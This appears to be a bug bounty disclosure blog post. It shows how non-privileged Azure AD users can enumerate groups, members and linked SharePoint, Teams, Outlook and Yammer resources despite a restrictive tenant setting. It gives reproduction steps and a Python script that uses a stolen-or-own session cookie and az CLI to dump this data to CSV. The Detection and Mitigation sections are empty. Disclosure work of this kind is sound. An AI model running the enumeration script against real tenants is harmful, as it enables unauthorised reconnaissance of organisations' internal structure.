---
layout: post
title: Bug bounty - Azure - Enumerate groups-related resources
date: 2023-15-02 10:00:00
description: Non critical lack of access control in Azure Identity API
tags: bugbounty
authors:
  - name: Molx32

bibliography: 2023-08-01-Update-management.bib

toc:
  - name: Equations
    # if a section has subsections, you can add them as follows:
    # subsections:
    #   - name: Example Child Subsection 1
    #   - name: Example Child Subsection 2
  - name: Citations
  - name: Footnotes
  - name: Code Blocks
  - name: Layouts
  - name: Other Typography?
---
I recently reported an issue that could be regarded as a vulnerability, but Microsoft acknowledged telling me this is the expected behavior.

# Context
When configuring an Azure AD, there are common features and settings that are usually hardened to restrict users' permissions. One of these settings is <b>Restrict user ability to access groups features in the Access Panel</b>. Configuring this setting should apply access control and prevent users from accessing this data from the Access Panel API : as you may think, there is not access control applied and any user member of the organization (i.e. does not apply to Guest users) can access this data.

## Setting set on No (permissive)
When the setting is configured to be permissive, any non-privileged user can access the following data :
- List of groups
- List of resources associated to groups : Outlook, SharePoint, Yammer, Teams
- List of people member of groups
Administrators may want to disable this feature to prevent users seing this data. <u>Note</u> : Guest users can not see this.
<div class="col-sm mt-3 mt-md-0">
  <iframe width="560" height="315" src="https://www.youtube.com/embed/O8qMV-Besw8" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" allowfullscreen></iframe>
</div>

## Setting set on Yes (restrictive)
When the setting is configured to be restrictive, there is an error page that prevents group and group resource enumeration.
<div class="col-sm mt-3 mt-md-0">
  {% include figure.html path="assets/img/MS_vuln_01.png" class="img-fluid rounded z-depth-1" %}
</div>

# The vulnerability
## What is the goal?
The goal is not enumerate groups-related resources :
- SharePoint
- Yammer
- Outlook
- Teams

## Reproduction steps
To reproduce the issue :
1. As an administrator, set the <b>Restrict user ability to access groups features in the Access Panel</b> setting on Yes
2. Authenticate as a non-privileged user
3. Get a group GUID
4. Access https://account.activedirectory.windowsazure.com/r#/manageMembership?objectType=Group&objectId=<GUID>

<div class="col-sm mt-3 mt-md-0">
  <iframe width="560" height="315" src="https://www.youtube.com/embed/NgG_SMecn9k" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" allowfullscreen></iframe>
</div>

## Automation
{% highlight python %}
import subprocess
import sys
import csv
import requests
import json

# Used to invoke Azure CLI commands
def run(cmd):
    completed = subprocess.run(["powershell", "-Command", cmd], capture_output=True)
    return completed

# Used to export findings into CSV
def write_header():
    s = 'Id,DisplayName,JoinPolicy,SharePointUrl,TeamsUrl,OutlookUrl,YammerUrl\n'
    with open('results.csv', 'a') as result_file:
        result_file.write(s)
# Used to write line into CSV
def write_line(data):
    json_data = json.loads(data)
    print(json_data)
    s = str(json_data['Id']) + ',' + str(json_data['DisplayName']) + ',' + str(json_data['JoinPolicy']) + ',' + str(json_data['SharePointUrl']) + ',' + str(json_data['TeamsUrl']) + ',' + str(json_data['OutlookUrl']) + ',' + str(json_data['YammerUrl']) + '\n'
    
    with open('results.csv', 'a') as result_file:
        result_file.write(s)

# Used to fecth and parse data
def retrieve_data(cookie, guid):
    url_base = "https://account.activedirectory.windowsazure.com"
    url_path = "/group/DetailsData/"

    # Final values
    url = url_base + url_path + guid
    headers = {
        'Cache-Control':'max-age=0',
        'Sec-Ch-Ua':'"Opera";v="93", "Not/A)Brand";v="8", "Chromium";v="107"',
        'Sec-Ch-Ua-Mobile':'?0',
        'Sec-Ch-Ua-Platform':'"Windows"',
        'Upgrade-Insecure-Requests':'1',
        'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36 OPR/93.0.0.0',
        'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
        'Sec-Fetch-Site':'none',
        'Sec-Fetch-Mode':'navigate',
        'Sec-Fetch-User':'?1',
        'Sec-Fetch-Dest':'document',
        'Accept-Encoding':'gzip, deflate',
        'Accept-Language':'en-US,en;q=0.9',
        'Connection':'close'
    }

    cookies = {'.AspNet.Cookies': cookie}

    r = requests.get(url, headers=headers, cookies=cookies)
    data = r.content.decode().splitlines()[1]
    return data
    



if __name__ == '__main__':

    # Handle cookie argument.
    # The '.AspNet.Cookies' must not be passed, only the hash value
    cookie = sys.argv[1]
    if not cookie:
        print('Error with provided arguments\nExample: python3 enumerate.py 1EMV2FJC_E_cwrBkZIu_ufEP[...]]7v3Lw')
        sys.exit(1)


    # Shoud be done with az ad group list
    export_groups_cmd = "az login; az ad group list > groups.tmp"

    # CONNECT MSOL
    r = run(cmd=export_groups_cmd)
    if r.returncode != 0:
        print("An error occured: %s", r.stderr)
    else:
        print(export_groups_cmd + " command executed successfully!")

    # Parse JSON
    # Read file
    data = None
    with open("groups.tmp", encoding='utf-16') as data_file:
        write_header()
        groups = json.load(data_file)
        for group in groups:
            data = retrieve_data(cookie, group['id'])
            write_line(data)

    print("*** FILE results.csv CREATED ***")
{% endhighlight %}

# Detect and remediate
## Detection
## Mitigation


